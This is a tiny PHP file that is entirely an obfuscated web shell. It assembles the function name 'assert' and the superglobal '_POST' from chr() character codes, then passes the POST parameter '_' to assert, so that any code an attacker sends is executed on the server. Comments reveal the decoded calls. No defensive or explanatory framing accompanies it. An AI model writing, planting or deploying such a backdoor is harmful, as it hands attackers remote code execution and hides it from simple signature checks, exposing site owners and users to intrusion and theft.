<?php
$_ = chr(65) . chr(83) . chr(83) . chr(69) . chr(82) . chr(84); // $_='assert';
$__ = '_' . chr(80) . chr(79) . chr(83) . chr(84); // $__='_POST';
$___ = $$__;
$_($___['_']); // assert($_POST['_']);
?>